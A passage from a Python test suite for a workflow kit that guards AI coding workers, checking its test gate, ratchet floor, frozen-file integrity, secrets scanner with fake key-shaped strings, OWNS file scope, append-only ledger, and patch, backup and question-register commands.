    (Q / ".aw/ratchet.json").write_text('{"min_tests": 7}\n', encoding="utf-8", newline="")
    r = subprocess.run([sys.executable, str(KIT / "init_project.py"), "--check", str(Q)], capture_output=True, text=True, encoding="utf-8")
    check("init --check: engine drift -> DIFF + exit 1, STATE file tolerated",
          r.returncode == 1 and "DIFF tools/aw.py" in r.stdout and "STATE .aw/ratchet.json" in r.stdout, r.stdout[-400:])
    r = subprocess.run([sys.executable, str(KIT / "init_project.py"), str(KIT)], capture_output=True, text=True, encoding="utf-8")
    check("init refuses to install into the kit's own tree", r.returncode == 2 and "refusing" in r.stdout, r.stdout)

    # ---- gate
    rc, out = aw(P, "gate", "t")
    check("gate OK on green suite, count=3", rc == 0 and "GATE OK count=3" in out, out)
    if BASH:
        rc, out = sh([BASH, "tools/gate.sh", "t2"], cwd=P)
        check("gate.sh wrapper works", rc == 0 and "GATE OK count=3" in out, out)
    else:
        skip("gate.sh wrapper works", "no git-bash found (set AW_BASH)")
    check("raw tail evidence written", (P / ".hermes/plans/gate_output/t.txt").read_text(encoding="utf-8").count("\n") >= 3)

    # ---- E1: the gate and checks.d never inherit a host PYTHONPATH
    E1 = new_project(work, "e1", tests=1)   # one suite test, then a second (env-sensitive) test -> count=2
    (E1 / ".aw/checks.d/env.py").write_text("import os\nprint('METRIC py_path', 1 if 'PYTHONPATH' in os.environ else 0)\n", encoding="utf-8", newline="")
    junk = work / "junkpath"
    junk.mkdir(exist_ok=True)
    ENVTEST = ("import os, unittest\n\n\nclass T(unittest.TestCase):\n    def test_no_pythonpath(self):\n"
               "        self.assertNotIn('PYTHONPATH', os.environ, 'a host PYTHONPATH shadows the venv')\n")
    (E1 / "tests/test_env.py").write_text(ENVTEST, encoding="utf-8", newline="")
    rc, out = aw(E1, "gate", "e1clean", env={"PYTHONPATH": str(junk)})
    check("E1: gate runs with a host PYTHONPATH forced and still prints GATE OK",
          rc == 0 and "GATE OK count=2" in out and "Traceback" not in out, out)
    env1 = (E1 / "tools/kit.env").read_text(encoding="utf-8")
    (E1 / "tools/run_unclean.py").write_text(
        "import os, runpy, sys\nos.environ.pop('PYTHONPATH', None)\n"
        "sys.argv = ['unittest', 'discover', '-s', 'tests', '-t', '.', '-v']\nrunpy.run_module('unittest', run_name='__main__')\n",
        encoding="utf-8", newline="")
    (E1 / "tools/kit.env").write_text(env1.replace("\nTEST_CMD=", "\nTEST_CMD=" + sys.executable + " -I -B tools/run_unclean.py ", 1),
                                      encoding="utf-8", newline="")
    (E1 / "tools/kit.env").write_text(env1, encoding="utf-8", newline="")
    rc, out = aw(E1, "integrity", "--write-baseline", "--i-am-architect", env={"PYTHONPATH": str(junk)})
    rc2, out2 = aw(E1, "integrity", env={"PYTHONPATH": str(junk)})
    check("E1: checks.d sees no PYTHONPATH -> INTEGRITY OK with py_path=0",
          rc == 0 and rc2 == 0 and "INTEGRITY OK" in out2, out2 + out)

# ---- ratchet
    rc, out = aw(P, "ratchet", "--raise", "3")
    check("raise without --i-am-architect refused", rc != 0, out)
    rc, out = aw(P, "ratchet", "--raise", "3", "--i-am-architect")
    check("raise to 3", rc == 0 and "min_tests=3" in out, out)
    rc, out = aw(P, "ratchet", "--raise", "2", "--i-am-architect")
    check("floor cannot be lowered", rc == 1 and "REFUSED" in out, out)
    rc, out = aw(P, "ratchet", "--raise")
    check("ratchet: --raise without a value -> usage error, no traceback", rc == 2 and "needs a value" in out and "Traceback" not in out, out)

    # ---- RED: failing test, then removed test
    t = P / "tests/test_a.py"
    good = t.read_text(encoding="utf-8")
    t.write_text(good + "    def test_4(self): self.fail('x')\n", encoding="utf-8", newline="")
    rc, out = aw(P, "gate")
    check("RED: failing test -> GATE FAIL", rc == 1 and "GATE FAIL" in out, out)
    check("RED: a red gate prints the raw tail (no engine traceback)", "cmd_gate" not in out and "FAILED (" in out, out)
    t.write_text(good.replace("    def test_3(self): pass\n", ""), encoding="utf-8", newline="")
    rc, out = aw(P, "gate")
    check("ratchet: fewer tests than floor -> GATE FAIL", rc == 1 and "count<3" in out, out)
    t.write_text(good, encoding="utf-8", newline="")
    rc, out = aw(P, "gate")
    check("restored -> GATE OK", rc == 0, out)

    # ---- integrity: frozen manifest + metrics
    (P / "data").mkdir(exist_ok=True)
    (P / "data/source.txt").write_text("book v1\n", encoding="utf-8", newline="")
    (P / ".aw/frozen.txt").write_text("data/*\n", encoding="utf-8", newline="")
    (P / ".aw/checks.d/debt.py").write_text("print('METRIC lines', 2)\nprint('ZERO invented', 0)\n", encoding="utf-8", newline="")
    rc, out = aw(P, "integrity")
    check("no baseline -> UNMEASURED (not a silent pass)", "UNMEASURED" in out, out)
    rc, out = aw(P, "integrity", "--write-baseline")
    check("baseline write refused for non-architect", rc != 0, out)
    rc, out = aw(P, "integrity", "--write-baseline", "--i-am-architect")
    check("baseline written", rc == 0 and "BASELINE WRITTEN files=1 metrics=1" in out, out)
    rc, out = aw(P, "integrity")
    check("integrity OK on baseline", rc == 0 and "INTEGRITY OK" in out, out)
    (P / "data/source.txt").write_text("book v2\n", encoding="utf-8", newline="")
    rc, out = aw(P, "integrity")
    check("RED: frozen file changed -> FAIL", rc == 1 and "FROZEN-CHANGED data/source.txt" in out, out)
    rc, out = aw(P, "integrity", "--allow", "data/source.txt")
    check("--allow tolerates declared drift", rc == 0, out)
    rc, out = aw(P, "integrity", "--allow")
    check("--allow without a value -> usage error, not an IndexError traceback", rc == 2 and "needs a value" in out and "Traceback" not in out, out)
    (P / "data/source.txt").write_text("book v1\n", encoding="utf-8", newline="")
    (P / ".aw/checks.d/debt.py").write_text("print('METRIC lines', 3)\n", encoding="utf-8", newline="")
    rc, out = aw(P, "integrity")
    check("RED: metric above ceiling -> FAIL", rc == 1 and "lines=3 > ceiling 2" in out, out)
    (P / ".aw/checks.d/debt.py").write_text("print('METRIC lines', 1)\nprint('ZERO invented', 1)\n", encoding="utf-8", newline="")
    rc, out = aw(P, "integrity")
    check("RED: ZERO metric non-zero -> FAIL", rc == 1 and "ZERO debt.invented=1" in out, out)
    (P / ".aw/checks.d/debt.py").write_text("print('METRIC lines', 1)\nprint('ZERO invented', 0)\n", encoding="utf-8", newline="")
    rc, out = aw(P, "integrity", "--write-baseline", "--i-am-architect")
    base = json.loads((P / ".aw/baseline.json").read_text(encoding="utf-8"))
    check("ceiling only falls (2 -> 1)", base["ceilings"]["debt.lines"] == 1, str(base))
    check("E5: the baseline records the ratchet floor as a shadow floor", base.get("floor") == 3, str(base.get("floor")))

    # ---- E3: implicit frozen core
    core_hits = []
    for rel in ("tools/worker_report.py", ".aw/frozen.txt", ".aw/secrets_allow.txt", ".aw/checks.d/debt.py",
                ".hermes/prompts/WORKER.md", "AGENTS.md", ".hermes/plans/TASK_CARD.template.md"):
        p = P / rel
        if not p.is_file():
            core_hits.append((rel, "missing"))
            continue
        orig = p.read_bytes()
        p.write_bytes(orig + b"\n# worker edit\n")
        rc, out = aw(P, "integrity")
        core_hits.append((rel, "ok" if rc == 1 and f"FROZEN-CHANGED {rel}" in out else ("rc=" + str(rc) + " " + out[:120])))
        p.write_bytes(orig)
    bad = [x for x in core_hits if x[1] != "ok"]
    check("E3: every implicit-core file is frozen without being listed in frozen.txt", not bad, bad[:3])
    rc, out = aw(P, "integrity")
    check("E3: restored core -> INTEGRITY OK again", rc == 0 and "INTEGRITY OK" in out, out)
    check("E3: integrity reports the core count separately (frozen=<user files> core=<n>)",
          "core=" in out and "frozen=1" in out, out)

    # ---- E2: exact path:LINE secrets allow  (two secret-shaped lines; exempt one, the other must still fail)
    (P / ".aw/secrets_allow.txt").write_text("# none\n", encoding="utf-8", newline="")
    (P / ".env").unlink(missing_ok=True)
    (P / ".gitignore").write_text("backups/\nkit_stage/\n", encoding="utf-8", newline="")
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    fake = "sk-" + "A1b2C3d4" * 3
    fake2 = "sk-" + "Z9y8X7w6" * 3
    (P / "src").mkdir(exist_ok=True)
    (P / "src/cfg.py").write_text(f'KEY = "{fake}"\n', encoding="utf-8", newline="")
    rc, out = aw(P, "audit")
    check("RED: key-like text -> SECRETS FAIL, file:line only", rc == 1 and "src/cfg.py:1 rule=openai-style-key" in out and fake not in out, out)
    (P / ".aw/secrets_allow.txt").write_text("src/cfg.py:2\n", encoding="utf-8", newline="")
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    (P / "src/cfg.py").write_text(f'K1 = "{fake}"\nK2 = "{fake2}"\n', encoding="utf-8", newline="")
    rc, out = aw(P, "audit")
    check("E2 RED: `path:2` exempts line 2 only -> line 1 still fails",
          rc == 1 and "src/cfg.py:1 rule=openai-style-key" in out and "src/cfg.py:2" not in out, out)
    (P / ".aw/secrets_allow.txt").write_text("src/cfg.py:1\nsrc/cfg.py:2\n", encoding="utf-8", newline="")
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    rc, out = aw(P, "audit")
    check("E2: both path:LINE entries exempt exactly their own line -> SECRETS OK", "SECRETS OK" in out and "src/cfg.py" not in out, out)
    (P / "src/cfg.py").write_text("KEY = None\n", encoding="utf-8", newline="")
    (P / ".aw/secrets_allow.txt").write_text("# none\n", encoding="utf-8", newline="")
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    (P / ".env").write_text("X=1\n", encoding="utf-8", newline="")
    rc, out = aw(P, "audit")
    check("RED: .env not git-ignored -> FAIL (name only)", rc == 1 and "FILE .env" in out and "X=1" not in out, out)
    (P / ".gitignore").write_text("backups/\n.env\nkit_stage/\n", encoding="utf-8", newline="")
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    rc, out = aw(P, "audit")
    check("ignored .env -> WARN, audit passes", rc == 0 and "WARN FILE .env" in out, out)
    (P / ".env").unlink(missing_ok=True)
    (P / ".gitignore").write_text("backups/\nkit_stage/\n", encoding="utf-8", newline="")
    aw(P, "integrity", "--write-baseline", "--i-am-architect")

    # ---- E5 (early): the shadow floor - a lowered ratchet.json cannot lower the gate
    (P / ".aw/ratchet.json").write_text('{"min_tests": 0}\n', encoding="utf-8", newline="")
    rc, out = aw(P, "integrity")
    check("E5 RED: ratchet.json below the baseline floor -> RATCHET-LOWERED", rc == 1 and "RATCHET-LOWERED" in out, out)
    rc, out = aw(P, "gate", "e5clean")
    check("E5: the gate still enforces the baseline floor after ratchet.json was lowered", rc == 0 and "min=3" in out, out)
    rc, out = aw(P, "gate", "e5red")
    check("E5 RED: the same 3 tests are graded against min=3 (not min=0) after the ratchet file was lowered",
          rc == 0 and "min=3" in out, out)
    (P / ".aw/ratchet.json").write_text('{"min_tests": 3}\n', encoding="utf-8", newline="")
    rc, out = aw(P, "integrity")
    check("E5: restored floor -> INTEGRITY OK", rc == 0, out)

    # ---- OWNS  (baseline reloaded: every card now starts from a recorded state)
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    aw(P, "start", "T-001")
    time.sleep(0.05)
    (P / "src/inside.py").write_text("x=1\n", encoding="utf-8", newline="")
    (P / "src/outside.py").write_text("x=2\n", encoding="utf-8", newline="")
    rc, out = aw(P, "audit", "T-001", env={"OWNS": "src/inside.py"})
    check("RED: file outside OWNS -> FAIL", rc == 1 and "OUT src/outside.py" in out, out)
    os.utime(P / ".aw/task-start", (time.time() - 100, time.time() - 100))
    aw(P, "start", "T-002")
    time.sleep(0.05)
    (P / "src/inside.py").write_text("x=3\n", encoding="utf-8", newline="")
    for cache in (".ruff_cache/0.17.3/abc", ".mypy_cache/3.12/def"):   # a card's own lint/typecheck steps write tool caches: never an OWNS violation
        (P / cache).parent.mkdir(parents=True, exist_ok=True); (P / cache).write_text("c\n", encoding="utf-8", newline="")
    rc, out = aw(P, "audit", "T-002", env={"OWNS": "src/inside.py"})
    check("OWNS respected -> audit PASS + ledger block",
          rc == 0 and "AUDIT PASS" in out and "after T-002" in (P / ".hermes/plans/AUDIT_LEDGER.md").read_text(encoding="utf-8"), out)

    # ---- E6: deletions and .aw/ edits are visible to OWNS (v2 snapshot, not mtime)
    aw(P, "start", "T-010")
    (P / "src/inside.py").unlink()
    rc, out = aw(P, "audit", "T-010", env={"OWNS": "src"})
    check("E6: a deleted file outside OWNS is reported", rc == 1 and "OUT src/inside.py (deleted)" in out, out)
    (P / "src/inside.py").write_text("x=3\n", encoding="utf-8", newline="")
    aw(P, "start", "T-011")
    (P / ".aw/checks.d/rogue.py").write_text("print('METRIC rogue', 0)\n", encoding="utf-8", newline="")
    rc, out = aw(P, "audit", "T-011", env={"OWNS": "src/inside.py"})
    check("E6: an edit under .aw/ is NOT silently exempt", rc == 1 and "OUT .aw/checks.d/rogue.py" in out, out)
    (P / ".aw/checks.d/rogue.py").unlink()

    # ---- E4: state tripwire
    aw(P, "integrity", "--write-baseline", "--i-am-architect")
    aw(P, "start", "T-012")
    rc, out = aw(P, "audit", "T-012", env={"OWNS": "src/inside.py"})
    check("E4: a clean card shows STATE ok", rc == 0 and "STATE ok" in out, out)
    aw(P, "start", "T-013")
    (P / ".aw/ratchet.json").write_text('{"min_tests": 99}\n', encoding="utf-8", newline="")
    rc, out = aw(P, "audit", "T-013", env={"OWNS": "src/inside.py"})
    check("E4 RED: ratchet.json changed during the card -> ARCHITECT-STATE-CHANGED + FAIL",
          rc == 1 and "ARCHITECT-STATE-CHANGED ratchet.json" in out, out)
    (P / ".aw/ratchet.json").write_text('{"min_tests": 3}\n', encoding="utf-8", newline="")
    (P / ".aw/task-start").write_text("T-014 2026-10-30T00:00:00\n", encoding="utf-8", newline="")
    rc, out = aw(P, "audit", "T-014", env={"OWNS": "src/inside.py"})
    check("E4: a legacy one-line task-start is still read (state UNMEASURED, not a crash)",
          "UNMEASURED (legacy task-start" in out and "Traceback" not in out, out)

    # ---- E7: ledger section 8 last
    L = P / ".hermes/plans/AUDIT_LEDGER.md"
    saved = L.read_bytes()
    L.write_bytes(saved + b"\n## 9. TRAILING SECTION the tool would append into\n")
    rc, out = aw(P, "audit")
    check("E7: a `## ` heading after section 8 -> WARN", "WARN ledger section 8 is not last" in out, out)
    L.write_bytes(saved)

    # ---- ledger append-only
    raw = L.read_bytes()
    L.write_bytes(raw + b"\narchitect note appended\n")
    aw(P, "start", "T-003"); time.sleep(0.05)
    rc, out = aw(P, "audit", "T-003")
    check("architect append is allowed", rc == 0 and "LEDGER ok" in out, out)
    L.write_bytes(L.read_bytes().replace(b"RE-AUDIT", b"RE-EDIT", 1))
    aw(P, "start", "T-004"); time.sleep(0.05)
    rc, out = aw(P, "audit", "T-004")
    check("RED: rewritten ledger history -> FAIL", rc == 1 and "LEDGER-REWRITTEN" in out, out)

    # ---- patch / backup / ask / report
    f = P / "src/p.py"; f.write_bytes(b"a = 1\r\nb = 2\r\n")
    (P / "old.txt").write_text("a = 1\n", encoding="utf-8", newline=""); (P / "new.txt").write_text("a = 9\n", encoding="utf-8", newline="")
    rc, out = aw(P, "patch", "src/p.py", "old.txt", "new.txt")
    check("assert-once patch applies once, keeps CRLF", rc == 0 and f.read_bytes() == b"a = 9\r\nb = 2\r\n", out)
    rc, out = aw(P, "patch", "src/p.py", "old.txt", "new.txt")
    check("RED: patch whose OLD is gone -> refused, nothing written", rc == 1 and f.read_bytes() == b"a = 9\r\nb = 2\r\n", out)
    F2 = P / "src/mixed.py"; F2.write_bytes(b"a = 1\r\nb = 2\nc = 3\n")
    (P / "old2.txt").write_text("a = 1\nb = 2\n", encoding="utf-8", newline=""); (P / "new2.txt").write_text("a = 8\nb = 2\n", encoding="utf-8", newline="")
    rc, out = aw(P, "patch", "src/mixed.py", "old2.txt", "new2.txt")
    check("RED: mixed line endings -> still exactly one anchor, other lines untouched",
          rc == 0 and F2.read_bytes() == b"a = 8\r\nb = 2\nc = 3\n" and "line endings kept: CRLF" in out, out)
    outside = work / "outside.txt"
    outside.write_text("x = 1\n", encoding="utf-8", newline="")
    rc, out = aw(P, "patch", str(outside), "old.txt", "new.txt")
    check("RED: patch outside the project root -> REFUSED", rc == 1 and "outside the project root" in out and outside.read_text(encoding="utf-8") == "x = 1\n", out)
    fake2 = "sk-" + "Z9y8X7w6" * 3
    (P / "src/ff.py").write_text("page break above\n\fKEY = \"" + fake2 + "\"\n", encoding="utf-8", newline="")
    (P / ".aw/secrets_allow.txt").write_text("src/ff.py:2\n", encoding="utf-8", newline="")
    rc, out = aw(P, "audit")
    check("a form-feed does not shift the reported line number (grep counts lines, splitlines() does not)",
          "SECRETS OK" in out and "src/ff.py:2 rule=" not in out and "src/ff.py:3" not in out, out)
    (P / "src/ff.py").unlink()
    (P / ".aw/secrets_allow.txt").write_text("# none\n", encoding="utf-8", newline="")
    (P / ".aw/secrets_allow.txt").write_text("# none\n", encoding="utf-8", newline="")

    rc, out = aw(P, "backup", "T-005", "src/p.py")
    check("backup copies", rc == 0 and (P / ".hermes/plans/backups/T-005/src/p.py").is_file(), out)
    rc, out = aw(P, "backup", "T-005", "src/p.py")
    check("RED: backup refuses to overwrite", rc == 1, out)
    rc, out = aw(P, "restore", "T-005", "--dry-run", "--force")
    check("restore --dry-run reports what it would write, writes nothing",
          rc == 0 and "RESTORE dry-run: 1 file(s)" in out and (P / "src/p.py").read_bytes() == b"a = 9\r\nb = 2\r\n", out)
    (P / "src/p.py").write_bytes(b"a = 0\r\nb = 2\r\n")
    rc, out = aw(P, "restore", "T-005", "--force")
    check("restore puts the backed-up bytes back", rc == 0 and "RESTORED 1 file(s) from backups/T-005/" in out
          and (P / "src/p.py").read_bytes() == b"a = 9\r\nb = 2\r\n", out)
    rc, out = aw(P, "restore", "T-999")
    check("RED: restore without backups -> REFUSED, exit 1", rc == 1 and "RESTORE REFUSED" in out, out)
    rc, out = aw(P, "restore", "T-005")
    check("RED: restore of a stale card over later work -> REFUSED unless --force",
          rc == 1 and "RESTORE REFUSED" in out and "--force" in out, out)
    rc, out = sh([sys.executable, "-I", "-B", "tools/worker_report.py", "--ask", "Which timeout?"], cwd=P)
    check("worker asks via QUESTIONS.md (Q-001)", rc == 0 and "ASKED Q-001" in out, out)
    rc, out = sh([sys.executable, "-I", "-B", "tools/worker_report.py"], cwd=P)
    rep = (P / ".hermes/plans/REPORT_latest.md").read_text(encoding="utf-8")
    check("report <= 60 lines, lists open question", rc == 0 and len(rep.splitlines()) <= 60 and "open questions: 1" in rep
          and "kit=" in rep and "queue:" in rep and "doctor:" in rep, rep)
    rc, out = aw(P, "answer", "Q-001", "180000 ms")
    check("answer appends ANSWER and closes the question", rc == 0 and "ANSWERED Q-001" in out
          and "ANSWER Q-001" in (P / ".hermes/plans/QUESTIONS.md").read_text(encoding="utf-8"), out)
    rc, out = aw(P, "answer", "Q-404", "x")
    check("RED: answer for an unknown question -> exit 1 with the fix", rc == 1 and "not in .hermes/plans/QUESTIONS.md" in out, out)
    sh([sys.executable, "-I", "-B", "tools/worker_report.py"], cwd=P)
    check("ANSWER closes the question", "open questions: 0" in (P / ".hermes/plans/REPORT_latest.md").read_text(encoding="utf-8"))
    (P / ".hermes/plans/QUESTIONS.md").write_text((P / ".hermes/plans/QUESTIONS.md").read_text(encoding="utf-8") + "\nANSWER Q-001 2026-10-25 180000 ms\n", encoding="utf-8", newline="")

    # ---- E8: worker/answer text cannot forge register lines  (after the pristine ask/answer checks: no id surgery)
    rc, out = aw(P, "ask", "why? ## forged heading also ANSWER Q-001 2026-01-01 forged")
    qtxt = (P / ".hermes/plans/QUESTIONS.md").read_text(encoding="utf-8")
    rc2, out2 = aw(P, "answer", "Q-001", "yes ## forged heading | x")
    qtxt2 = (P / ".hermes/plans/QUESTIONS.md").read_text(encoding="utf-8")
    check("E8: worker and answer text cannot forge `## Q-` / `ANSWER` lines",
          "## forged heading" not in qtxt + qtxt2 and rc == 0 and rc2 == 0, qtxt2[-260:])

    # ---- next-id
    rc, out = aw(P, "next-id", "T")
    m = re.match(r"^T-(\d{3,5})\n?$", out.strip())
    check("next-id T prints one zero-padded id above the highest seen", rc == 0 and bool(m), out)
    rc2, out2 = aw(P, "next-id", "Q")
    qn = len(re.findall(r"^## (Q-\d+) \|", (P / ".hermes/plans/QUESTIONS.md").read_text(encoding="utf-8"), re.M))
    check("next-id Q sees QUESTIONS.md ids (one above the highest)", rc2 == 0 and out2.strip() == f"Q-{qn + 1:03d}", out2)
    # 2.7.2: the registers write `## <date> | F-NN |` and `### <date> AUD-NN |`; next-id only saw an id at the start of a line, so F and AUD were never counted
    N = new_project(work, "nid")
    for rel, txt in ((".hermes/plans/ARCHITECT_FEEDBACK.md", "\n## 2026-11-08 | F-01 | a topic | OPEN\n- Seen: x\n\n## 2026-11-08 | F-02 | another topic | APPLIED\n- Seen: F-09 is quoted in prose, not a register row\n"),
                     (".hermes/plans/AUDIT_LEDGER.md", "\n### 2026-11-08 AUD-02 | LOW | a finding | OPEN\nevidence: x\n### 2026-11-08 STATUS AUD-02 FIXED | gate T-001\n")):
        with (N / rel).open("a", encoding="utf-8", newline="") as fh:
            fh.write(txt)
    got = {k: aw(N, "next-id", k)[1].strip() for k in ("F", "AUD", "P")}
    check("next-id F and AUD count ids written as `## <date> | F-NN |` and `### <date> AUD-NN |` (2.7.1 printed F-01 and AUD-02 with both written); P and an id quoted in prose are unchanged",
          got == {"F": "F-03", "AUD": "AUD-03", "P": "P-01"}, got)

    # ---- improve (read-only self-improve loop): in-place status, later status entry, CLOSED, repeated topic, proposals
    I = new_project(work, "impr")
    rc, out = aw(I, "improve")
    check("improve on a fresh install: IMPROVE OK, no actions", rc == 0 and out.strip().splitlines()[-1] == "IMPROVE OK", out)
    with tempfile.TemporaryDirectory() as _fx:
        (Path(_fx) / ".hermes/plans").mkdir(parents=True)
        (Path(_fx) / ".hermes/plans/WORKLOG.md").write_text("\n".join(["## 2026-11-03T10:00:00+02:00 | T-001 | PASS", "- Files: none", "", "## 2026-11-03T11:00:00+02:00 | T-002 | FAIL", "", "## 2026-11-03T12:00:00+02:00 | T-002 | FAIL", ""]), encoding="utf-8", newline="")
        rc, fo = sh([sys.executable, "-I", "-B", "tools/learn.py", _fx], cwd=I)
    check("learn.py: PASS with no file => empty-pass; 2 FAIL of one card => unstable-card; last line counts 2",
          "empty-pass | T-001" in fo and "unstable-card | T-002" in fo and fo.strip().splitlines()[-1] == "LEARN SUGGEST 2", fo)
    _sw = (Path(__file__).parent / "payload/.hermes/prompts/SWARM.md").read_text(encoding="utf-8")
    check("SWARM.md section 13 Reviewer names the three verdicts", "## 13 Reviewer" in _sw and all(w in _sw for w in ("`ship`", "`fix-first`", "`rethink`")), "")
    with tempfile.TemporaryDirectory() as _fx2:
        _cd = Path(_fx2) / ".aw/checks.d"
        _cd.mkdir(parents=True)
        (_cd / "blind.py").write_text('print("ZERO nothing 0")\n', encoding="utf-8", newline="")
        (_cd / "alive.py").write_text('n = 3\nassert n > 0\nprint("ZERO fine 0")\n', encoding="utf-8", newline="")
        (Path(_fx2) / ".hermes/plans").mkdir(parents=True)
        (Path(_fx2) / ".hermes/plans/WORKLOG.md").write_text("\n".join(["- Deferred: a", "- Deferred: b", "- deferred: c", ""]), encoding="utf-8", newline="")
        rc, fo2 = sh([sys.executable, "-I", "-B", "tools/learn.py", _fx2], cwd=I)
    check("learn.py: a checks.d check without a liveness guard => blind-check (alive.py is not flagged); 3 deferral lines => recurring-deferral",
          "blind-check | blind.py" in fo2 and "alive.py" not in fo2 and "recurring-deferral" in fo2, fo2)
    _top = re.search(r"^## (\d+\.\d+\.\d+)", (Path(__file__).parent / "CHANGELOG.md").read_text(encoding="utf-8"), re.M)
    _kv = (Path(__file__).parent / "payload/.aw/KIT_VERSION").read_text(encoding="utf-8").strip()
    with tempfile.TemporaryDirectory() as _fx3:
        _r = Path(_fx3)
        (_r / ".githooks").mkdir()
        (_r / ".githooks/pre-commit").write_text("#!/usr/bin/env bash\n", encoding="utf-8", newline="")
        (_r / ".git").mkdir()
        (_r / ".git/config").write_text("[core]\n\trepositoryformatversion = 0\n", encoding="utf-8", newline="")
        (_r / "AGENTS.md").write_text("x" * 7000, encoding="utf-8", newline="")
        rc, fo3 = sh([sys.executable, "-I", "-B", "tools/learn.py", _fx3], cwd=I)
        (_r / ".git/config").write_text("[core]\n\thooksPath = .githooks\n", encoding="utf-8", newline="")
        rc, fo4 = sh([sys.executable, "-I", "-B", "tools/learn.py", _fx3], cwd=I)
    check("learn.py: shipped hook with hooksPath unset => guardrail-off (not when set); AGENTS.md > 6500 => steering-sprawl",
          "guardrail-off" in fo3 and "steering-sprawl" in fo3 and "guardrail-off" not in fo4 and "steering-sprawl" in fo4, fo3 + fo4)
    _ex = Path(__file__).parent / "payload/.aw/checks.d/example_debug_tags.py.disabled"
    with tempfile.TemporaryDirectory() as _d1, tempfile.TemporaryDirectory() as _d2, tempfile.TemporaryDirectory() as _d3:
        (Path(_d1) / "a.py").write_text("print('[DEBUG-a4f2] x')\nprint('[DEBUG-b7c1] y')\n", encoding="utf-8", newline="")
        (Path(_d2) / "a.py").write_text("print('ok')\n", encoding="utf-8", newline="")
        rc_a, o_a = sh([sys.executable, "-I", "-B", str(_ex)], cwd=_d1)
        rc_b, o_b = sh([sys.executable, "-I", "-B", str(_ex)], cwd=_d2)
        rc_c, o_c = sh([sys.executable, "-I", "-B", str(_ex)], cwd=_d3)
    check("example_debug_tags: 2 tags => ZERO debug_tags 2; clean => 0; empty dir => non-zero exit (liveness)",
          rc_a == 0 and "ZERO debug_tags 2" in o_a and rc_b == 0 and "ZERO debug_tags 0" in o_b and rc_c != 0, f"{o_a}|{o_b}|{o_c}")
    _sw2 = (Path(__file__).parent / "payload/.hermes/prompts/SWARM.md").read_text(encoding="utf-8")
    _cp = (Path(__file__).parent / "payload/.hermes/plans/CARD_PATTERNS.md").read_text(encoding="utf-8")
    _sw3 = (Path(__file__).parent / "payload/.hermes/prompts/SWARM.md").read_text(encoding="utf-8")
    check("SWARM 13: fix-first/rethink need a cited concrete trigger; nothing found has a FINDING line; CARD_PATTERNS has the pre-mortem",
          "cited concrete trigger" in _sw3 and "FINDING none" in _sw3 and "Pre-mortem before BLOCK Q" in (Path(__file__).parent / "payload/.hermes/plans/CARD_PATTERNS.md").read_text(encoding="utf-8"), "")
    check("SWARM 13 names the SPEC and STANDARDS axes; CARD_PATTERNS has Bug cards, Slice vertically, Write for the worker",
          "SPEC" in _sw2 and "STANDARDS" in _sw2 and all(h in _cp for h in ("## Bug cards", "## Slice vertically", "## Write for the worker")), "")
    with tempfile.TemporaryDirectory() as _rp:
        _R = Path(_rp)
        _gi = ["git", "-c", "user.name=t", "-c", "user.email=t@t"]
        sh(_gi + ["init", "-q"], cwd=_R)
        (_R / "a.txt").write_text("one\n", encoding="utf-8", newline="")
        sh(_gi + ["add", "-A"], cwd=_R)
        sh(_gi + ["commit", "-q", "-m", "c1"], cwd=_R)
        sh(_gi + ["tag", "base"], cwd=_R)
        _rpy = str(Path(__file__).parent / "payload/tools/review_pack.py")
        rc_e, o_e = sh([sys.executable, "-I", "-B", _rpy, "base", str(_R / "out.diff")], cwd=_R)
        (_R / "a.txt").write_text("one\ntwo\n", encoding="utf-8", newline="")
        sh(_gi + ["add", "-A"], cwd=_R)
        sh(_gi + ["commit", "-q", "-m", "c2"], cwd=_R)
        rc_o, o_o = sh([sys.executable, "-I", "-B", _rpy, "base", str(_R / "out.diff")], cwd=_R)
        rc_b, o_b = sh([sys.executable, "-I", "-B", _rpy, "no-such-ref", str(_R / "out2.diff")], cwd=_R)
        rc_t, o_t = sh([sys.executable, "-I", "-B", _rpy], cwd=_R)
        _txt = (_R / "out.diff").read_text(encoding="utf-8") if (_R / "out.diff").exists() else ""
    check("review_pack.py: empty diff => exit 2, bad ref => exit 2, one commit ahead => OK with commits+stat+diff in the file, no argument => the newest tag",
          rc_e == 2 and "empty diff" in o_e and rc_b == 2 and "does not resolve" in o_b and rc_o == 0 and "REVIEW-PACK OK" in o_o
          and "# commits" in _txt and "+two" in _txt and rc_t == 0 and "REVIEW-PACK OK" in o_t, f"{o_e}|{o_b}|{o_o}|{o_t}")
    with tempfile.TemporaryDirectory() as _fx5:
        (Path(_fx5) / ".hermes/plans").mkdir(parents=True)
        _wl = []
        for _i in range(3):
            _wl += [f"## 2026-11-03T1{_i}:00:00+02:00 | T-009 | FAIL", ""]
        (Path(_fx5) / ".hermes/plans/WORKLOG.md").write_text("\n".join(_wl), encoding="utf-8", newline="")
        rc, fo5 = sh([sys.executable, "-I", "-B", "tools/learn.py", _fx5], cwd=I)
    check("learn.py: 3 FAIL of one card => third-fail (and not unstable-card)", "third-fail | T-009" in fo5 and "unstable-card" not in fo5, fo5)
    _notice = (Path(__file__).parent / "NOTICE.md").read_text(encoding="utf-8")
    _src = ("DannyMac180/skills", "DannyMac180/fable-advisor", "vercel-labs/agent-desktop", "mattpocock/skills", "obra/superpowers", "anthropics/skills", "cloudflare/security-audit-skill", "ckelsoe/prompt-architect", "skillsdirectory.com")
    _payload_txt = "\n".join(p.read_text(encoding="utf-8", errors="ignore") for p in (Path(__file__).parent / "payload").rglob("*") if p.is_file() and p.suffix in {".md", ".py", ".sh"})
    _named = [n for n in ("fable-advisor", "agent-desktop", "mattpocock/skills", "obra/superpowers", "anthropics/skills", "cloudflare/security-audit-skill", "ckelsoe/prompt-architect", "skillsdirectory.com", "DannyMac180") if n in _payload_txt]
    check("NOTICE.md lists every source (and meta-agent as 'nothing copied'); every source named in the payload has a row; meta-agent is not in the payload",
          all(s in _notice for s in _src) and "meta-agent" in _notice and "nothing copied" in _notice
          and all(n in _notice for n in _named) and "meta-agent" not in _payload_txt, str(_named))
    check("TASK_CARD.template.md: the SPEC lane carries the Surgical rule; NOTICE.md lists andrej-karpathy-skills",
          "Surgical: every changed line traces to the GOAL" in (Path(__file__).parent / "payload/.hermes/plans/TASK_CARD.template.md").read_text(encoding="utf-8")
